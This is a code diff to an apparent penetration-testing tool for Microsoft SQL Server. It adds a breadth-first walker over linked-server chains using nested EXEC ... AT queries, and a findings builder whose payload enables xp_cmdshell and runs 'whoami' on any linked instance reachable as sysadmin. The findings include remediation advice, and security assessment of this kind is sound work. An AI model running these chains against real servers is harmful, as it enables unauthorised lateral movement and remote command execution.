@@ -570,22 +570,27 @@ def parse_enum(output: str) -> dict:
     return sections
 
 
+def _mssqlclient_cmd(ip: str, creds: dict, port: int, windows_auth: bool) -> list[str] | None:
+    tool = mssqlclient_tool()
+    if not tool:
+        return None
+    user, secret, dom = creds.get("user", ""), creds.get("secret", ""), creds.get("domain", "")
+    if windows_auth and dom:
+        cmd = [tool, f"{dom}/{user}:{secret}@{ip}", "-windows-auth"]
+    else:
+        cmd = [tool, f"{user}:{secret}@{ip}"]
+    if port and port != _DEFAULT_PORT:
+        cmd += ["-port", str(port)]
+    return cmd
+
+
 def run_mssqlclient(ip: str, creds: dict, port: int = _DEFAULT_PORT,
                     windows_auth: bool = True) -> tuple[dict | None, str | None]:
     """Connect with impacket-mssqlclient and run the enumeration script. Returns
     (sections, error). sections is None when the tool is missing or login failed."""
-    tool = mssqlclient_tool()
-    if not tool:
+    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
+    if cmd is None:
         return None, "impacket-mssqlclient not installed"
-    user, secret, dom = creds.get("user", ""), creds.get("secret", ""), creds.get("domain", "")
-    if windows_auth and dom:
-        target = f"{dom}/{user}:{secret}@{ip}"
-        cmd = [tool, target, "-windows-auth"]
-    else:
-        target = f"{user}:{secret}@{ip}"
-        cmd = [tool, target]
-    if port and port != _DEFAULT_PORT:
-        cmd += ["-port", str(port)]
     out, err = _run_stdin(cmd, build_enum_script())
     if err:
         return None, err
@@ -593,6 +598,20 @@ def run_mssqlclient(ip: str, creds: dict, port: int = _DEFAULT_PORT,
     if not sections.get("server"):
         return None, "login failed or nothing returned"
     return sections, None
+
+
+def link_runner(ip: str, creds: dict, port: int = _DEFAULT_PORT,
+                windows_auth: bool = True):
+    """A runner(script)->output for walk_links: runs a batch on the ENTRY instance
+    via impacket-mssqlclient. Returns a callable; '' on tool-missing / error."""
+    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
+
+    def run(script: str) -> str:
+        if cmd is None:
+            return ""
+        out, err = _run_stdin(cmd, script)
+        return "" if err else out
+    return run
 
 
 def chains_from_enum(target: dict, enum: dict, creds: dict | None):
@@ -697,6 +716,118 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None):
         "config": cfg, "hashes": hashes,
     }
     return fs, chain, summary
+
+
+# --- recursive linked-server walk (the MSSQLPwner graph) ------------------------
+# The identity/privilege/sublinks query run AT each remote node. Uses the
+# FOR XML PATH trick (works on 2008+) to concatenate the node's own linked servers.
+_LINK_INNER = (
+    "SELECT CAST(@@SERVERNAME AS varchar(128))+'|'+CAST(SYSTEM_USER AS varchar(128))+'|'+"
+    "CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(4))+'|'+ISNULL(STUFF((SELECT ','+name "
+    "FROM sys.servers WHERE is_linked=1 FOR XML PATH('')),1,1,''),'')")
+# The command run AT a node for effect (RCE) once you hold sysadmin there.
+_RCE_INNER = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
+              "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'")
+
+
+def _nested_at(path: list[str], inner: str) -> str:
+    """Wrap `inner` in EXEC('...') AT [link] for each hop in `path` (entry->path[0]
+    ->path[1]->...). Single quotes are doubled once per level - the standard
+    linked-server chaining. path=[] returns inner unchanged."""
+    s = inner
+    for link in reversed(path):
+        s = "EXEC ('%s') AT [%s]" % (s.replace("'", "''"), link)
+    return s
+
+
+def _parse_link_node(output: str, idx: int) -> dict | None:
+    """Pull the '@@L:idx .. @@LE:idx'-wrapped result row for one path."""
+    import re
+    m = re.search(rf"@@L:{idx}\b(.*?)@@LE:{idx}\b", output, re.S)
+    if not m:
+        return None
+    for line in m.group(1).splitlines():
+        line = line.strip()
+        if "|" in line and "----" not in line and not line.startswith("@@"):
+            parts = [c.strip() for c in line.split("|")]
+            return {"server": parts[0] if parts else "",
+                    "login": parts[1] if len(parts) > 1 else "",
+                    "sysadmin": len(parts) > 2 and parts[2] == "1",
+                    "links": [x for x in (parts[3].split(",") if len(parts) > 3 else []) if x]}
+    return None
+
+
+def walk_links(entry_links: list[str], runner, max_depth: int = 4,
+               max_nodes: int = 60) -> list[dict]:
+    """BFS the linked-server graph from the entry instance. `entry_links` is the
+    entry's own linked-server names; `runner(script)->output` runs a sentinel batch
+    ON THE ENTRY instance (the nested EXEC AT reaches through). Returns nodes:
+    {path, depth, server, login, sysadmin, links}. Cycles + depth + node count are
+    all bounded so a bidirectional linked-server mesh can't loop forever."""
+    nodes: list[dict] = []
+    expanded: set[str] = set()
+    frontier = [[link] for link in entry_links]
+    depth = 1
+    while frontier and depth <= max_depth and len(nodes) < max_nodes:
+        parts = []
+        for i, path in enumerate(frontier):
+            parts.append(f"SELECT '@@L:{i}'")
+            parts.append(_nested_at(path, _LINK_INNER))
+            parts.append(f"SELECT '@@LE:{i}'")
+        out = runner("\n".join(parts) + "\nexit\n") or ""
+        nxt = []
+        for i, path in enumerate(frontier):
+            if len(nodes) >= max_nodes:
+                break
+            info = _parse_link_node(out, i)
+            if info is None:                       # RPC off / link down / access denied
+                continue
+            nodes.append({"path": path, "depth": depth, "server": info["server"],
+                          "login": info["login"], "sysadmin": info["sysadmin"],
+                          "links": info["links"]})
+            key = (info["server"] or "|".join(path)).upper()
+            if key in expanded:                    # already expanded this server - cycle
+                continue
+            expanded.add(key)
+            path_servers = {p.upper() for p in path} | {key}
+            for child in info["links"]:
+                if child.upper() not in path_servers:   # don't re-enter a server on this path
+                    nxt.append(path + [child])
+        frontier = nxt
+        depth += 1
+    return nodes
+
+
+def link_findings(target: dict, nodes: list[dict], creds: dict | None):
+    """Findings + chain steps from a linked-server walk. Every node reachable as
+    sysadmin is a full compromise of that instance (enumerate + RCE commands)."""
+    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
+    fs: list[dict] = []
+    chain: list[str] = []
+    sa_nodes = [n for n in nodes if n["sysadmin"]]
+    for n in sa_nodes:
+        route = " -> ".join([target.get("live_login") or "entry"] + n["path"])
+        server = n["server"] or n["path"][-1]
+        fs.append(_finding(
+            "critical", f"Linked-server chain to SYSADMIN on {server}", tgt,
+            f"Reachable as sysadmin ({n['login']}) on {server} via {route} "
+            f"(depth {n['depth']}).", "impacket-mssqlclient / mssqlpwner",
+            _nested_at(n["path"], _RCE_INNER),
+            "Fix the linked-server login mapping (don't map to sysadmin); disable "
+            "'rpc out' where not required.", ["CWE-269", "CWE-284"]))
+        chain.append(f"reach SYSADMIN on {server} via linked chain ({route}) -> "
+                     "xp_cmdshell RCE")
+    if nodes and not sa_nodes:
+        deepest = max(nodes, key=lambda n: n["depth"])
+        fs.append(_finding(
+            "medium", f"Linked-server graph: {len(nodes)} instance(s) reachable", tgt,
+            "Reachable linked instances: " + ", ".join(
+                (n["server"] or n["path"][-1]) + (" [sa]" if n["sysadmin"] else "")
+                for n in nodes[:10]) + f". Deepest: {' -> '.join(deepest['path'])}.",
+            "impacket-mssqlclient / mssqlpwner",
+            _nested_at(deepest["path"], "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"),
+            "Review linked-server login mappings and 'rpc out' settings.", ["CWE-284"]))
+    return fs, chain
 
 
 # --- top-level analysis ---------------------------------------------------------
